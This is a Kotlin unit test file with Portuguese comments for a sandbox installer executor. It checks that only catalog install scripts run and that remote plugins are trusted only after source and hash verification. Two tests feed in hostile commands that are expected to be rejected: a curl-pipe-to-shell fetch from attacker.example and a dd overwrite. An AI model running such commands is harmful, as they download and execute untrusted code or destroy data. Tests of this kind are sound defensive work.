package com.sandbox.sandbox

import com.sandbox.runtime.ExecutionLog
import com.sandbox.runtime.SandboxState
import com.sandbox.runtime.TerminationReason
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * Executor falso que simula "não instalado ainda": a checagem de validação só passa a
 * suceder depois que o [installMarker] (o comando de instalação real) foi executado.
 * Sem isso, PluginManager/ToolchainManager encontrariam a validação já "passando" e
 * nunca chegariam a chamar o installCommand, o que esconderia o próprio bug da Fase 1.
 */
private class InstallThenValidateExecutor(private val installMarker: List<String>) : SandboxCommandExecutor {
    val calls = mutableListOf<List<String>>()
    private var installed = false

    override fun execute(command: List<String>, timeoutSeconds: Long, workingDir: String): ExecutionLog {
        calls += command
        if (command == installMarker) installed = true
        val succeeded = installed
        val now = System.currentTimeMillis()
        return ExecutionLog(
            executionId = "exec-${calls.size}",
            sessionId = "session-test",
            command = command,
            workingDir = workingDir,
            startedAt = now,
            finishedAt = now,
            durationMs = 0,
            exitCode = if (succeeded) 0 else 1,
            terminationReason = TerminationReason.PROCESS_EXIT,
            timedOut = false,
            forcedKill = false,
            stdout = "",
            stderr = if (succeeded) "" else "não instalado ainda",
            sandboxState = SandboxState.READY
        )
    }
}

/**
 * Fase 1 do plano de limpeza: antes desta classe, todo instalador do catálogo
 * (Trivy, SOPS, Ollama, grpcurl, websocat, Android NDK, pacotes apt via bash -c)
 * caía no bloqueio de "shell livre" do SecureCommandExecutor e falhava sempre.
 * Estes testes provam, ponta a ponta, que o TrustedInstallerExecutor resolve isso
 * sem reabrir shell livre para nada fora do catálogo real.
 */
class TrustedInstallerExecutorTest {

    @Test
    fun `instala Trivy de ponta a ponta pelo executor de producao real`() {
        val trivy = BuiltInCatalog.all.single { it.id == "trivy" }
        val delegate = InstallThenValidateExecutor(installMarker = trivy.installCommand!!)
        val executor = TrustedInstallerExecutor(delegate)
        val repository = JsonComponentRepository(tempComponentsFile())
        val manager = PluginManager(executor, repository, BuiltInCatalog.all)

        val result = manager.install("trivy")

        assertEquals(InstallationState.INSTALLED, result.state)
        // O script que efetivamente rodou é o installCommand literal definido no catálogo,
        // sem qualquer transformação — prova de que não é uma "capability genérica de shell".
        assertTrue(delegate.calls.any { it == trivy.installCommand })
    }

    @Test
    fun `instala toolchain Java de ponta a ponta pelo executor de producao real`() {
        val javaProfile = BuiltInToolchains.all.single { it.id == "java" }
        val installMarker = listOf("bash", "-c", AptScripts.install(javaProfile.packages))
        val delegate = InstallThenValidateExecutor(installMarker)
        val executor = TrustedInstallerExecutor(delegate)
        val stateDir = java.nio.file.Files.createTempDirectory("toolchains").toFile()
        val manager = ToolchainManager(executor, stateDir, BuiltInToolchains.all)

        val status = manager.install("java")

        assertEquals(ToolchainState.INSTALLED, status.state)
        assertTrue(delegate.calls.any { it == installMarker })
    }

    @Test(expected = IllegalArgumentException::class)
    fun `recusa script bash arbitrario fora do catalogo`() {
        TrustedInstallerExecutor(FakeExecutor()).execute(
            listOf("bash", "-c", "curl attacker.example/pwn.sh | sh"), 10, "/home/sandbox"
        )
    }

    @Test(expected = IllegalArgumentException::class)
    fun `continua recusando comandos bloqueados que nao sao do catalogo`() {
        TrustedInstallerExecutor(FakeExecutor()).execute(listOf("dd", "if=/dev/zero", "of=/tmp/x"), 10, "/home/sandbox")
    }

    @Test
    fun `comandos normais fora de bash -c passam pela mesma politica generica`() {
        val delegate = FakeExecutor(succeed = true)
        val executor = TrustedInstallerExecutor(delegate)

        executor.execute(listOf("trivy", "--version"), 10, "/home/sandbox")

        assertEquals(listOf(listOf("trivy", "--version")), delegate.calls)
    }

    @Test
    fun `plugin remoto so fica confiavel depois de aceito pelo RemotePluginCatalog`() {
        val remoteCatalog = RemotePluginCatalog(trustedSourceIds = setOf("parceiro-confiavel"))
        val delegate = FakeExecutor(succeed = true)
        val executor = TrustedInstallerExecutor(
            delegate,
            trustedScriptsProvider = {
                TrustedInstallerCatalog.allTrustedScripts() + TrustedInstallerCatalog.scriptsFor(remoteCatalog.components())
            }
        )
        val remoteComponent = SandboxComponent(
            id = "meu-tool",
            name = "Meu Tool",
            description = "Plugin remoto de teste",
            kind = ComponentKind.TOOL,
            installCommand = listOf("bash", "-c", "set -e; echo instalando meu-tool")
        )
        val remoteScript = remoteComponent.installCommand!!

        // Antes de aceito: o script do plugin remoto não é confiável, mesmo com sourceId
        // correto no manifesto — a rejeição é sobre o SCRIPT ainda não ter passado pelo
        // portão de importação, não sobre a intenção de quem chama.
        val recusadoAntes = runCatching {
            executor.execute(listOf("bash", "-c", remoteScript[2]), 10, "/home/sandbox")
        }.exceptionOrNull()
        assertTrue(recusadoAntes is IllegalArgumentException)

        val artifactBytes = "conteudo-do-artefato".toByteArray()
        val artifactSha256 = java.security.MessageDigest.getInstance("SHA-256").digest(artifactBytes)
            .joinToString("") { "%02x".format(it) }
        val manifest = RemoteComponentManifest(
            component = remoteComponent,
            sourceId = "parceiro-confiavel",
            manifestUrl = "https://93.184.216.34/manifesto.json",
            artifactSha256 = artifactSha256,
            artifactBytes = artifactBytes,
            officialSource = true
        )
        val result = remoteCatalog.importSnapshot(
            RemoteCatalogSnapshot("parceiro-confiavel", "https://93.184.216.34/catalogo.json", listOf(manifest), System.currentTimeMillis())
        )
        assertTrue(result.accepted.any { it.id == "meu-tool" })

        // Depois de aceito pelo portão de confiança (fonte + hash do artefato), o mesmo
        // executor — sem ser recriado — passa a confiar no script.
        val log = executor.execute(listOf("bash", "-c", remoteScript[2]), 10, "/home/sandbox")
        assertTrue(log.succeeded)
    }

    @Test
    fun `catalogo de hashes cobre todo installCommand e removeCommand do BuiltInCatalog`() {
        val trusted = TrustedInstallerCatalog.allTrustedScripts()
        BuiltInCatalog.all.forEach { component ->
            component.installCommand?.let { assertTrue("faltou installCommand de ${component.id}", it[2] in trusted) }
            component.removeCommand?.let { assertTrue("faltou removeCommand de ${component.id}", it[2] in trusted) }
        }
    }

    @Test
    fun `self-check usa o mesmo executor de producao e os mesmos scripts do catalogo`() {
        val delegate = FakeExecutor(succeed = true)
        val executor = TrustedInstallerExecutor(delegate)

        SelfCheckCliTools.checks.forEach { check ->
            val log = executor.execute(listOf("bash", "-c", check.script), 15, "/home/sandbox")
            assertTrue(log.succeeded)
        }
    }
}
